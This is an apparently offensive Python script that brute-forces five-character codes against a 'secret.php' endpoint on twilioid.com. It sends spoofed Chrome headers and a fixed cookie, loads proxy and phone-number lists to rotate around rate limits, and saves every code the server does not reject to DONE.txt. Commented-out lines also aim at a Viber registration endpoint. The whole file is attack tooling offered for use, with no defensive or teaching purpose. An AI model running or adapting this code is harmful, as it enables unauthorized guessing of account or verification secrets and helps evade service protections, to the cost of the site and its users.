import requests
import random
import string 
from time import sleep
from colorit import *
init_colorit()


############################################
#goz2 gded

from datetime import datetime


#time = int(datetime.now().timestamp())

#link_string = ""
#with requests.Session() as s:
    #r = s.get(link)
   # link_string = str(s.cookies)
    

ranad_code=""
xml = """code={0}"""
chars_num = 5 


proxy_list = []
phone_list = []

def app_proxy(path_of_proxy_file):
    file = open(path_of_proxy_file, "r")
    line_count = -1
    for line in file:
        if line != "\n":
            line_count += 1
            proxy_list.append(line.rstrip(""))
    file.close()
    
def get_randomChracters():
    ranad_code = ''.join(random.choices(string.ascii_lowercase + string.digits, k = chars_num)) 
    return ranad_code

def app_phone(path_of_phone_file):
    file = open(path_of_phone_file, "r")
    line_count = -1
    for line in file:
        if line != "\n":
            line_count += 1
            phone_list.append(line.rstrip("\n"))
    file.close()

def random_choice(path_of_file):
    urlar = []
    file = open(path_of_file, "r")
    line_count = -1
    for line in file:
        if line != "\n":
            line_count += 1
            urlar.append(line.rstrip("\n"))
    file.close()
    return urlar[random.randint(0, line_count)]
    
def write_file(string):
    file_object = open('DONE.txt', 'a')
    file_object.write("https://twilioid.com/webtwilio/secret.php?"+string)
    file_object.write("\n")
    file_object.close()
    
    
    
def getxml(xxx):
    #PhoneNumber = phone_number  
    #CountryIDDCode = random_choice("CountryIDDCode.txt")
    xml = """code={0}""".format(xxx)
    #xml = {
    #'phone_number' : '{0}'.format(PhoneNumber),
    #'cc' : '{0}'.format(CountryIDDCode)
    #}
    return xml

def getheaders():
    #content_length = 39
    #accept_encoding = "gzip, deflate, br "
    #ssc = "\" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\""
    #cok = random_choice("cookiee.txt")
    #secureq = random_choice("secure.txt")
    #ans = random_choice("authentcation.txt")
    headers = {
            'Host': 'twilioid.com',
            'Connection': 'keep-alive',
            'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'DNT': '1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en',
            'Cookie': 'name=extn; code=lqpct; user=57_web_extn; prefix=57_web' 
            }
    return headers


# get all proxy to proxy_list
app_proxy("proxy.txt")
proxy_list_len = len(proxy_list)
#############################
# get all phones to phone_list
app_phone("PhoneNumber.txt")
phone_list_len = len(phone_list)
#############################
program_len = 99999





coun_f = 0
coun_t = 0

y = "b"



print(color("\t \t \t \t\t\t   " + "Coded By Es", Colors.yellow))
print(color("Starting...", Colors.blue))

#loop program
p = 0
while p < program_len:
    
    
    
    # loop proxy 
    prox = 0
    while prox< proxy_list_len:
        http_proxy  = "http://" + proxy_list[prox]
        proxyDict = {"http"  : http_proxy}
        count_proxy = 0
        
        
        
        # loop phones   
        pho = 0
        while pho < phone_list_len:
            xml = getxml(get_randomChracters())
            sleep(2)        
            headers = getheaders()
            
  
            s = ""
            
            try:
                if (y == "b"):
                    #s = requests.get('https://twilioid.com/webtwilio/secret.php?{0}'.format(xml), json=xml, headers=headers,proxies=proxyDict).text
                    #print(s)
                    #s= "204"
                    #print("Once")
                    y = "cg"
                
                #s = requests.get('https://twilioid.com/webtwilio/secret.php?{0}'.format(xml), json=xml, headers=headers,proxies=proxyDict).status_code
                s = requests.get('https://twilioid.com/webtwilio/secret.php?{0}'.format(xml), json=xml, headers=headers).text
                print(s)
            except:
                count_proxy = count_proxy + 1
                if count_proxy > 3:
                    break
                print("LOT OF CALLED REACHED TO THIS PROXY -> " +  color(http_proxy, Colors.orange))
                 
               
            
            if (str(s) == "Sorry. User not found. Try again."):
                print(color(xml + " FAILED for user not found", Colors.yellow))
                print("")
                break
            elif (str(s) == "Request Limit Exceeded !!!"):
                print(color(xml + " Limit Exceeded", Colors.red))
                print("")
                break
            else: 
                print(color(xml + " Recorded", Colors.green))
                write_file(xml)
                break
    
            s="" 
           
            pho = pho + 1
        prox = prox + 1
    p = p + 1

  
print(color("finished", Colors.yellow))

            


#xml = getxml("1060926852")
#headers = getheaders(xml)

#http_proxy  = "http://" + "177.124.168.81:8080"
#proxyDict = {"http"  : http_proxy}
            
# Foreground

#print(color("This text is orange", Colors.orange))



#print(color("This text is purple", Colors.purple))
#print(color("This text is white", Colors.white))

#print(requests.post('http://secure.viber.com/viber/viber.php?function=RegisterUser', data=xml, headers=headers,proxies=proxyDict).text)

#i = 0
#while i < 10: 
##  print(requests.post('http://secure.viber.com/viber/viber.php?function=RegisterUser', data=xml, headers=headers).text)    
# i = i + 1

#------------------------------------------------------------------- Notes ----------------------------------------------------------------------------------
#h3ml eh
#kol ip --> proxy --> ytsl 3la koool el arkam yb2a ana kda ast8leet el proxy 100%


#loop program
    #loop PROXY
        #loop Arkam
    
#loop program
#p = 0
#while p << program_len:
    
    #p = p + 1


# loop proxy 
#prox = 0
#while prox< proxy_list_len:
    #print(proxy_list[prox])
    #print("\n")
    #prox = prox + 1
    

# loop phones   
#pho = 0
#while pho < phone_list_len:
    #print(phone_list[pho])
    #print("\n")
    #pho = pho + 1
